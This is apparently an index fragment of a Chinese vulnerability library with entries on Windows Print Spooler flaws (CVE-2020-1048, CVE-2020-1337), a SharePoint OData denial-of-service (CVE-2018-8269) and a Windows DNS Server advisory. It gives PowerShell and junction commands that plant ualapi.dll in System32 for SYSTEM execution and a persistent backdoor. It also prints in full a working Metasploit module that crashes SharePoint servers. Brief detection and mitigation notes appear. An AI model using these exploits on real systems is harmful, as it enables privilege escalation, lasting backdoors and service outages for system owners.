PrintDemon-master</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1048%20Microsoft%20Windows%20Print%20Spooler%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/#_2","title":"\u4e86\u89e3\u9700\u8981\u5229\u7528\u6f0f\u6d1e\u524d\u4e00\u4e9b\u57fa\u672c\u4fe1\u606f","text":"<p>Printers, Drivers, Ports</p> <p>\u6253\u5370\u673a\u81f3\u5c11\u6709\u4e24\u4e2a\u8981\u7d20</p> <p>\u6253\u5370\u673a\u7aef\u53e3        \u4f60\u53ef\u4ee5\u8ba4\u4e3a\u5b83\u662f\u73b0\u5728\u7684USB\u7aef\u53e3\uff0c\u751a\u81f3\u662fTCP/IP\u7aef\u53e3(\u548c\u5730\u5740)\uff0c\u6253\u5370\u673a\u53ef\u4ee5\u6253\u5370\u5230\u4e00\u4e2a\u6587\u4ef6(\u5728Windows 8\u53ca\u4ee5\u4e0a)</p> <p>\u6253\u5370\u673a\u9a71\u52a8\u7a0b\u5e8f    \u8fd9\u66fe\u7ecf\u662f\u4e00\u4e2a\u5185\u6838\u6a21\u5f0f\u7ec4\u4ef6\uff0c\u4f46\u662f\u6709\u4e86\u65b0\u7684\"v4\"\u6a21\u578b\uff0c\u8fd9\u4e9b\u90fd\u662f\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u5b8c\u6210\u7684\uff0c\u5230\u73b0\u5728\u5df2\u7ecf\u8d85\u8fc7\u5341\u5e74</p> <p>\u7531\u4e8e\u4ee5Spooler\u5b9e\u65bd\u7684\u670d\u52a1Spoolsv.exe\u5177\u6709SYSTEM\u7279\u6743\uff0c\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee\uff0c\u56e0\u6b64\u8fd9\u4e24\u4e2a\u8981\u7d20\u5438\u5f15\u4e86\u4eba\u4eec\u6267\u884c\u5404\u79cd\u6709\u8da3\u7684\u653b\u51fb\u3002</p> <p>\u4e3a\u4e86\u4f7f\u6807\u51c6\u7528\u6237\u5e10\u6237\u66f4\u5bb9\u6613\u4f7f\u7528\uff0c\u5e76\u4e14\u7531\u4e8e\u8fd9\u4e9b\u5e10\u6237\u73b0\u5728\u4ee5\u7528\u6237\u6a21\u5f0f\u8fd0\u884c\uff0c\u53ea\u8981\u9a71\u52a8\u7a0b\u5e8f\u662f\u4e00\u4e2a \u9884\u5148\u5b58\u5728\u7684\uff0c\u5185\u7f6e\u9a71\u52a8\u7a0b\u5e8f\uff0c\u4e0d\u9700\u8981\u4efb\u4f55\u7279\u6743\u5c31\u53ef\u4ee5\u5b89\u88c5\u4e00\u4e2a\u6253\u5370\u9a71\u52a8\u7a0b\u5e8f\u3002</p> <pre><code>Add-PrinterDriver` `-Name ``\"Generic / Text Only\"\n</code></pre> <p></p> <p>\u6dfb\u52a0\u4e00\u4e2a\u6253\u5370\u673a\u7aef\u53e3</p> <pre><code>Add-PrinterPort` `-Name ``\"C:\\windows\\tracing\\myport.txt\"\n</code></pre> <p>Get-PrinterPort | ft Name \u53ef\u4ee5\u67e5\u770b\u5230\u6216\u8005\u67e5\u770b\u6ce8\u518c\u8868\u8fd9\u4e2a\u4f4d\u7f6e</p> <p>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Ports</p> <p>\u5728peocessmointer\u76d1\u63a7\u4e2d\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u52a8\u4f5c\uff08\u53d1\u73b0\u6d4b\u8bd5\u51e0\u6b21\u622a\u56fe\u65f6\u641e\u6df7\u4e86\u6ca1\u6709\u539f\u6765\u7684\u56fe\u4e86\uff0c\u4e0b\u9762\u622a\u56fe\u4e2d\u7684C:\\windows\\test\\test.txt\u5b9e\u9645\u4e0a\u662fC:\\windows\\tracing\\myport.txt\uff09</p> <p></p> <p>\u7cfb\u7edf\u4e2d\u6dfb\u52a0\u4e00\u53f0\u65b0\u6253\u5370\u673a</p> <pre><code>Add-Printer` `-Name ``\"PrintDemon\"` `-DriverName ``\"Generic / Text Only\"` `-PortName ``\"c:\\windows\\tracing\\myport.txt\"\n</code></pre> <p>\u8f93\u51fa\u5230\u6587\u4ef6</p> <pre><code>\"Hello,Printer!\"` `| ``Out-Printer` `-Name ``\"PrintDemon\"\n</code></pre> <p>\u6253\u5370\u5230\u5185\u5bb9\u5728c:\\windows\\tracing\\myport.txt\uff0c\u6211\u4eec\u627e\u5230\u8fd9\u4e2a\u6587\u4ef6\u67e5\u770b\u4e00\u4e0b</p> <p></p> <p>hiew\u6253\u5f00\u6587\u6863\u4f1a\u53d1\u73b0\u5185\u5bb9\u5b9e\u9645\u6bd4\u6211\u4eec\u8f93\u5165\u7684\u8981\u591a\uff0cPowerShell\u8ba4\u4e3a\u8fd9\u662f\u5b9e\u9645\u7684\u6253\u5370\u673a\u3002\u56e0\u6b64\u4f1a\u6309\u7167\u6587\u6863\u683c\u5f0f\u7684\u8fb9\u8ddd\uff0c\u4e3a\u9876\u90e8\u8fb9\u8ddd\u6dfb\u52a0\u4e86\u51e0\u884c\u65b0\u5185\u5bb9\u3002 </p> <p>\u8ba9\u6211\u4eec\u91cd\u65b0\u521b\u5efa\u65b0\u7684\u6587\u4ef6C:\\Windows\\System32\\Ualapi.dll\uff0c\u8fd9\u4e2a\u4f4d\u7f6e\u56e0\u4e3a\u9700\u8981\u7279\u7279\u6b8a\u7684\u6743\u9650\u6240\u4ee5\u4f1a\u88ab\u963b\u62e6 \u8fd9\u4e2a\u51fd\u6570\u4f1a\u4f7fwindows print spooler\u670d\u52a1\u5bf9\u7aef\u53e3\u7684\u5408\u6cd5\u6027\u6821\u9a8c\uff0c\u5f53\u524d\u7528\u6237\u65e0\u6cd5\u5c06\u5176\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u81ea\u5df1\u4e0d\u5177\u6709\u8bbf\u95ee\u6743\u9650\u7684\u8def\u5f84</p> <p>\u521b\u5efa\u6587\u4ef6\u65f6\uff0c\u4f1a\u68c0\u67e5Token\u6743\u9650\u8fdb\u884c\u9a8c\u8bc1\uff0c\u540c\u65f6IDA\u4e2d\u4e5f\u80fd\u627e\u5230\u8fd9\u6bb5\u4ee3\u7801</p> <p></p> <p>\u4f46\u662f\u53ea\u6709\u5f53\u7528\u6237\u9009\u62e9\u4e86\u201c\u6253\u5370\u5230\u6587\u4ef6\u201d\u9009\u62e9\u6846\uff0c\u5728\u6253\u5370\u5bf9\u8bdd\u6846\u4e2d\u53ef\u4ee5\u770b\u5230\u3002</p> <p></p> <p>\u5728\u9009\u62e9\u5176\u4ed6\u5f62\u5f0f\u7684\u8f93\u51fa\u4f1a\u5b8c\u5168\u8df3\u8fc7\u6b64\u68c0\u67e5</p> <p></p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1048%20Microsoft%20Windows%20Print%20Spooler%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/#client-side-port-check-vulnerability-cve-2020-1048","title":"Client Side Port Check Vulnerability (CVE-2020-1048)","text":"<p>\u53ea\u9700\u8981\u4e00\u4e2aPowerShell\u547d\u4ee4 PowerShell\u4f7f\u7528add-printer\u547d\u4ee4\u5728\u5e95\u5c42\u5219\u662f\u76f4\u63a5\u8c03\u7528XcvData\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u5c06port name\u8bbe\u7f6e\u4e3a\u4efb\u610f\u6587\u4ef6\u800c\u4e0d\u88ab\u68c0\u67e5</p> <p>\u5c31\u662f\u8fd9\u4e48\u7b80\u5355\u3002UI\u5bf9\u8bdd\u6846\u5177\u6709\u68c0\u67e5\u529f\u80fd\uff0c\u800cPowerShell\u7684WMI\u6253\u5370\u63d0\u4f9b\u7a0b\u5e8f\u6a21\u5757\u5219\u6ca1\u6709\u3002 \u53ea\u9700Add-PrinterPort -Name c:\\windows\\system32\\ualapi.dll\u5728PowerShell\u7a97\u53e3\u4e2d\u6267\u884c\u5373\u53ef</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1337/","title":"CVE 2020 1337","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1337/#cve-2020-1337","title":"CVE-2020-1337","text":"<p>\u7ecf\u8fc7\u8865\u4e01\u540e\uff0c\u7d27\u968fCVE-2020-1048\u5176\u540e\u7684CVE-2020-1337\u53c8\u6709\u59ff\u52bf\u53ef\u4ee5\u7ed5\u68c0\u67e5</p> <p>\u4ecegithub\u4e0a\u83b7\u53d6\u6837\u672c\u5206\u6790</p> <p>https://github.com/math1as/cve-2020-1337-exploit</p> <pre><code>powershell -ep bypass ``-F` `C:\\CVE-2020-1337-exploit-master\\exploit.ps1\n</code></pre> <p>\u5728\u67e5\u770b\u4e86\u516c\u5e03\u7684\u811a\u672c\u6587\u4ef6\u53ef\u4ee5\u53d1\u73b0</p> <p>\u5b83\u7684\u547d\u4ee4\u4e5f\u662f\u975e\u5e38\u7684\u7b80\u5355\uff0c\u5728\u6267\u884c\u4e0a\u8ff0\u8fc7\u7a0b\u4e2d\u6dfb\u52a0\u4e86\u4e00\u6761\u547d\u4ee4\u521b\u5efa\u4e00\u4e2a\u7cfb\u7edf\u76ee\u5f55\u8f6f\u8054\u63a5</p> <pre><code>cmd /c mklink /J c:\\users\\test\\mytarg5 C:\\Windows\\system32\n</code></pre> <p>\u65e0\u8bba\u662fAddPort\u8fd8\u662f\u4fee\u590d\u540e\u7684XcvData\u51fd\u6570\u8fdb\u884c\u68c0\u67e5\u65f6\uff0c\u90fd\u662f\u5224\u65ad\u5f53\u524d\u7528\u6237\u662f\u5426\u5177\u6709\u5bf9\u76ee\u6807\u8def\u5f84\u7684\u8bbf\u95ee\u6743\u9650\u7684\u3002 \u5c06port name\u6307\u5411 c:\\users\\test\\myfolder\\xxx.dll \uff0c\u901a\u8fc7\u68c0\u67e5\u540e\uff0c\u518d\u5c06mytarg5\u4f5c\u4e3a\u4e00\u4e2a\u8f6f\u94fe\u63a5\u91cd\u5b9a\u5411\u5230\u76ee\u6807\u7684\u7cfb\u7edf\u8def\u5f84\u4e2d\uff0c\u5373\u53ef\u5b8c\u6210\u5bf9\u8865\u4e01\u7684\u7ed5\u8fc7\u3002</p> <p>\u521b\u5efa\u4e00\u4e2a\u8f6f\u8fde\u63a5\uff0c\u5c06\u6587\u4ef6\u6253\u5370\u4f4d\u7f6e\u6539\u4e3a c:\\users\\test\\mytarg5\uff0c\u4fbf\u4f1a\u5728C:\\Windows\\system32\u4e0b\u6210\u529f\u521b\u5efaualapi.dll</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1337/#ualapidll","title":"\u4e3a\u4ec0\u4e48\u662fualapi.dll","text":"<p>\u9996\u5148\u80fd\u591f\u5c06\u8fd9\u4f4d\u7f6e\u91ca\u653e\u6587\u4ef6\u6240\u4ee5\u6211\u4eec\u5c31\u8981\u60f3\u5c3d\u529e\u6cd5\u5229\u7528\u4e0a\uff0c\u663e\u7136\u5bb9\u6613\u53d7\u5230dll\u52ab\u6301\u5c1d\u8bd5\u653b\u51fb\u7684\u670d\u52a1\u7b2c\u4e00\u4e2a\u7a81\u7834\u53e3\uff0c \u8fd0\u884cProcess Monitor\uff0c\u542f\u52a8\u6240\u6709\u670d\u52a1\u8fdb\u884c\u5c1d\u8bd5\uff0c\u4e0d\u8fc7\u6211\u4eec\u8981\u5728\u505a\u7684\u65f6\u5019\u9700\u8981\u4e00\u4e9b\u9650\u5236\uff0c\u6211\u4eec\u73b0\u5728\u60f3\u63d0\u9ad8\u7279\u6743\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u5c1a\u672a\u542f\u52a8\u7684\u670d\u52a1\u6216\u8005\u5bfb\u627e\u4e00\u4e2a\u53ef\u4ee5\u88ab\u6807\u51c6\u7528\u6237\u505c\u6b62\u7684\u670d\u52a1\u3002 \u542f\u52a8\u670d\u52a1\u901a\u5e38\u9700\u8981\u7ba1\u7406\u6743\u9650\uff0c\u8fd9\u4e0d\u662f\u6211\u4eec\u60f3\u8981\u7684\uff0c\u901a\u8fc7accesschk\u5de5\u5177\u6211\u4eec\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u83b7\u53d6\u6240\u6709\u670d\u52a1\u7684\u6743\u9650\u3002 accesschk.exe -c * -L &gt; servsddl.txt servsddl.txt\u4e2d\u4f1a\u8bb0\u5f55\u6240\u6709\u670d\u52a1\u8f93\u51fa \u5728FAX\u670d\u52a1\u4e2d\u6211\u4eec\u53d1\u73b0\u4e86</p> <pre><code> ``[0] ACCESS_ALLOWED_ACE_TYPE: Everyone`` ``SERVICE_QUERY_STATUS`` ``SERVICE_START\n</code></pre> <p> \u670d\u52a1\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5b83</p> <p></p> <p>\u73b0\u5728\u8ba9\u6211\u4eec\u542f\u52a8FAX\u670d\u52a1\uff0c\u5e76\u901a\u8fc7ProcessMonitor\u76d1\u63a7\u4ed6</p> <p></p> <p>\u5728\u542f\u52a8\u6253\u5370\u8fd9\u4e2a\u670d\u52a1\u65f6\uff0c\u4ed6\u4f1a\u5c1d\u8bd5\u5bfb\u627eualapi.dll</p> <p>\u6240\u4ee5\u6211\u95e8\u5c06\u8fd9\u4e2adll\u653e\u7f6e\u5230\u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u7136\u540e\u60ca\u559c\u7684\u53d1\u73b0\uff0c\u542f\u52a8spoolsv\u65f6\u4f1a\u53d1\u73b0\u4e5f\u4f1a\u5bfb\u627e\u8fd9\u4e2adll</p> <p></p> <p>\u7ecf\u8fc7\u5bf9\u6bd4\u4ed6\u4eec\u90fd\u6709\u76f8\u540c\u7684\u5bfb\u627eualapi.dll\u7684\u4ee3\u7801\uff0c\u5728\u4e0b\u9762\u7684IDA\u4e2d\u53ef\u4ee5\u770b\u5230 \uff0c\u8be5\u670d\u52a1\u4f7f\u7528GetProcAddress\u67e5\u627eualapi.dll\u4e00\u4e9b\u5bfc\u51fa</p> <p></p> <p>\u65e2\u7136\u80fd\u591f\u52a0\u8f7d\u6211\u4eec\u5148\u524d\u91ca\u653e\u7684\u52a8\u6001\u5e93\uff0cdllmain\u4e2d\u5c31\u53ef\u4ee5\u6267\u884c\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u4ee3\u7801\uff0c\u4ecegithub\u4e0a\u62ff\u5230\u7684\u793a\u4f8b\u8fd0\u884c\uff08\u8fd0\u884c\u5728windows10\u7cfb\u7edf\u4e0a\uff09\uff0c\u4ed6\u91ca\u653e\u4e86\u4e00\u4e2aPE\u5728system32\u4e0b\uff0c\u4ee3\u7801\u4e5f\u975e\u5e38\u7b80\u5355\u7684\u8fd0\u884cwhoami\u67e5\u770b\u6743\u9650\u3002</p> <p></p> <p>\u6267\u884c\u540e\u6743\u9650\u662fsystem\uff0c\u8fd9\u5c31\u4ee3\u8868\u4f60\u80fd\u505a\u5f88\u591a\u4e8b\u60c5\u3002</p> <p></p> <p>\u6b63\u5f53\u6211\u60f3\u7740\u5982\u4f55\u5229\u7528dll\u88ab\u52a0\u8f7d\u8d77\u6765\u540e\uff0c\u60ca\u559c\u7684\u5728\u540e\u9762\u7684\u4ee3\u7801\u4e2d\u53d1\u73b0\uff0c\u5728spoolsv.exe\u4e2d\u4e5f\u6709\u8c03\u7528\u5bfc\u51fa\u51fd\u6570\uff0c\u8fd9\u53ea\u9700\u8981\u6211\u4eec\u7a0d\u5fae\u6784\u9020\u4e00\u4e0b\uff0c\u5c31\u80fd\u5236\u9020\u4e00\u4e2a\u6c38\u4e45\u540e\u95e8\uff0c\u5373\u4f7f\u8865\u4e01\u4fee\u6b63\u540e\u5b83\u4f9d\u7136\u5b58\u5728\u3002</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1337/#_1","title":"\u5982\u4f55\u907f\u514d","text":"<p>\u5982\u679c\u4f60\u4e0d\u5e78\u88ab\u8be5\u6f0f\u6d1e\u5229\u7528\u4e86\uff0c\u7531\u4e8e\u5373\u4f7f\u8865\u4e01\u4fee\u6b63\u540e\u5b83\u4f9d\u7136\u5b58\u5728\uff0c\u6240\u4ee5\u4f60\u9700\u8981\u5728PowerShell\u4e2d\u626b\u63cf\u6240\u6709\u57fa\u4e8e\u6587\u4ef6\u7684\u7aef\u53e3\uff0c\u67e5\u770bHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Ports\u5176\u4e2d\u5305\u542b\u6587\u4ef6\u8def\u5f84\u7684\u4efb\u4f55\u7aef\u53e3\uff0c\u5c24\u5176\u662f\u4ee5.DLL\u6216\u6269\u5c55\u540d\u7ed3\u5c3e\u7684\u7aef\u53e3\u3002</p> <p>\u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u5bb9\u6613\u5229\u7528\u7684\u6f0f\u6d1e\uff0c\u4f60\u5b8c\u5168\u53ef\u4ee5\u5c06\u4e00\u4efd\u540e\u95e8\u4ee3\u7801\u6784\u9020\u51fa\u73b0\u5728spoolsv.exe\u7684\u8c03\u7528\u4e2d\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1337/#_2","title":"\u53c2\u8003\u6587\u732e","text":"<p>https://github.com/math1as/cve-2020-1337-exploit https://github.com/ionescu007/faxhell https://mp.weixin.qq.com/s/LLzIlKrrfpJuk6CGBRZMvw https://windows-internals.com/faxing-your-way-to-system/ https://windows-internals.com/printdemon-cve-2020-1048/</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Office/Microsoft.Data.Odata%20%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/","title":"Microsoft.Data.Odata \u5b89\u5168\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Office/Microsoft.Data.Odata%20%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/#_1","title":"**|**\u6f0f\u6d1e\u6765\u6e90","text":"<p>https://www.securityfocus.com/bid/105322 https://cxsecurity.com/issue/WLB-2019010093 http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201809-479</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Office/Microsoft.Data.Odata%20%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/#_2","title":"**|**\u6f0f\u6d1e\u8be6\u60c5","text":"<p>Microsoft.Data.Odata\u662f\u7f8e\u56fd\u5fae\u8f6f\uff08Microsoft\uff09\u516c\u53f8\u53d1\u5e03\u7684\u4e00\u6b3e\u652f\u6301\u5f00\u653e\u6570\u636e\u534f\u8bae\uff08OData\uff09\u7684.NET  Framework\u5e8f\u5217\u5316\u5e93\u3002 Microsoft.Data.Odata\u4e2d\u5b58\u5728\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u7a0b\u5e8f\u6ca1\u6709\u6b63\u786e\u7684\u5904\u7406Web\u8bf7\u6c42\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u5411Odata\u5e94\u7528\u7a0b\u5e8f\u53d1\u9001\u7279\u5236\u7684\u8bf7\u6c42\u5229\u7528\u8be5\u6f0f\u6d1e\u4f7fOdata Web\u5e94\u7528\u7a0b\u5e8f\u65e0\u6cd5\u6b63\u5e38\u670d\u52a1\u3002                                                     </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Office/Microsoft.Data.Odata%20%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/#exp","title":"**|**\u6f0f\u6d1eEXP","text":"<pre><code>##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nrequire 'sharepoint-ruby'\n\nclass MetasploitModule &lt; Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n  include Msf::Exploit::Remote::HttpClient\n\n\n  def initialize(info = {})\n    super(update_info(info,\n        'Name'        =&gt; 'DOS Vulnerability in SharePoint 2016 Server',\n        'Description'    =&gt; %q{\n          A vulnerability in Microsoft SharePoint Server could allow a remote attacker to make the server unavailable.\n          The vulnerability is a result of the dependency SharePoint has in Microsoft.Data.OData library which was \n          vulnerable to remote DOS (See CVE-2018-8269). The exploit is done by sending a crafted request that contains\n          an OData filter that triggers the vulnerability in Microsoft.Data.OData library. Sending such request, will\n          terminate the process that runs the server. By default, SharePoint server is configured to recover a\n          terminated process, but it will do so only 10 times. If more than 10 malicious requests are sent in 5\n          minutes interval, the server will not recover and will be down until it is manually restarted.\n      },\n      'Author'         =&gt;\n        [\n          'Gil Mirmovitch', # Vulnerability discover and poc\n          'Gal Zror'        # Metasploit module\n        ],\n      'Platform'    =&gt; 'win',\n      'References'     =&gt;\n          [\n              [ 'CVE', '2018-8269' ],\n              [ 'ALEPH', '2018002' ]\n          ],\n      'Targets'     =&gt;\n          [\n              [ 'Microsoft Office SharePoint Server 2016', { } ],\n          ],\n\n          ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('SSL',  [true, 'Negotiate SSL/TLS for outgoing connections', true]),\n        OptString.new('USERNAME',  [true, 'The username to login with']),\n        OptString.new('PASSWORD',  [true, 'The password to login with']),\n        OptString.new('VHOST',  [true, 'HTTP server virtual host'])\n      ], self.class)\n\n  end\n\n  def fetch_auth_cookie\n    print_status(\"Fetching Authentication Cookie\")\n    begin\n      site = Sharepoint::Site.new vhost, 'server-relative-site-url'\n      site.session.authenticate datastore['USERNAME'], datastore['PASSWORD']\n      return site.session.cookie\n    rescue Sharepoint::Session::AuthenticationFailed\n      fail_with(Failure::NoAccess, \"Authentication failed\")\n    end\n    print_good(\"Authentication Succeeded\")\n  end\n\n  def extract_digest_value(cookie)\n    token_api_uri = '/_api/contextinfo'\n    res = send_request_cgi( {\n                                'method' =&gt; 'POST',\n                                'uri' =&gt; normalize_uri(token_api_uri),\n                                'cookie' =&gt; cookie,\n                            })\n    if res.nil?\n      fail_with(Failure::UnexpectedReply, \"Empty context response\")\n    end\n    res.get_xml_document.xpath('//d:FormDigestValue').text\n  end\n\n  def send_dos_request\n    send_request(6100)\n  end\n\n  def send_innocent_request\n    send_request(5)\n  end\n\n  def send_request(reps)\n    vuln_api_uri = \"/_api/$batch\"\n    cookie = datastore['COOKIE']\n\n    data = Rex::MIME::Message.new\n    data.add_part(\n        \"GET /_api/web/lists?$filter=true\" + \"+or+true\" * reps + \" HTTP/1.1\\r\\n\" +\n            \"accept: application/json;odata.metadata=minimal\\r\\n\", #Data is our payload\n        'application/http',                                       #Content Type\n        'binary',                                                 #Transfer Encoding\n        nil                                                       #Content Disposition\n    )\n    send_request_cgi({\n                           'method'   =&gt; 'POST',\n                           'uri'      =&gt; normalize_uri(vuln_api_uri),\n                           'ctype'  =&gt; \"multipart/mixed; boundary=#{data.bound}\",\n                           'data'   =&gt; data.to_s,\n                           'cookie' =&gt; cookie,\n                           'headers'      =&gt; {\n                               'x-requestdigest'    =&gt; extract_digest_value(cookie),\n                           }\n\n                       })\n  end\n\n  def dos\n    print_status(\"Sending DOS malicious requests...\")\n    (0..10).each {|i|\n      print_status(\"Countdown #{10 - i}...\")\n      send_dos_request\n      sleep(60)\n    }\n\n  end\n\n  def check\n    datastore['COOKIE'] = fetch_auth_cookie\n\n    print_status(\"Sending innocent request...\")\n    res = send_innocent_request\n\n    if res &amp;&amp; res.code == 200\n      print_good(\"Server responded 200 to innocent request\")\n    else\n      print_bad(\"Server response \" + res.code.to_s + \" to innocent request\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    print_status(\"Sending malicious request...\")\n    res = send_dos_request\n\n    if res.nil?\n      Exploit::CheckCode::Vulnerable\n    else\n      print_bad(\"Server response \" + res.code.to_s + \" to malicious request\")\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def run\n    if check == Exploit::CheckCode::Vulnerable\n      dos\n    end\n  end\nend\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"CVE-2020-1350 Windows DNS Server\u8815\u866b\u7ea7\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>\u5fae\u8f6f\u5b98\u65b9 \u53d1\u5e03\u4e86 Windows DNS Server \u7684\u98ce\u9669\u901a\u544a\uff0c\u8be5\u6f0f\u6d1e\u7f16\u53f7\u4e3a CVE-2020-1350\uff0c\u6f0f\u6d1e\u7b49\u7ea7\uff1a\u4e25\u91cd\u3002 Windows DNS Server\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u901a\u8fc7\u5411\u53d7\u5f71\u54cd\u670d\u52a1\u5668\u53d1\u9001\u7279\u5236\u7684\u8bf7\u6c42\u5305\uff0c\u53ef\u4ee5\u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u5f71\u54cd</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>Windows Server 2008 for 32-bit Systems Service Pack 2 Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) Windows Server 2008 for x64-based Systems Service Pack 2 Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core inastallation) Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server version 1909 (Server Core installation) Windows Server version 1903 (Server Core installation) Windows Server version 2004 (Server Core installation)</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_3","title":"\u4fee\u590d\u5efa\u8bae","text":"<p>\u5fae\u8f6f\u63d0\u4f9b\u4e86\u4e34\u65f6\u7684\u7f13\u89e3\u63aa\u65bd\uff1a \u4fee\u6539\u6ce8\u518c\u8868 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters \u503c\uff1aTcpReceivePacketSize \u6570\u636e\u7c7b\u578b DWORD = 0xFF00 \u6ce8\u610f\uff1a\u5fc5\u987b\u91cd\u65b0\u542f\u52a8 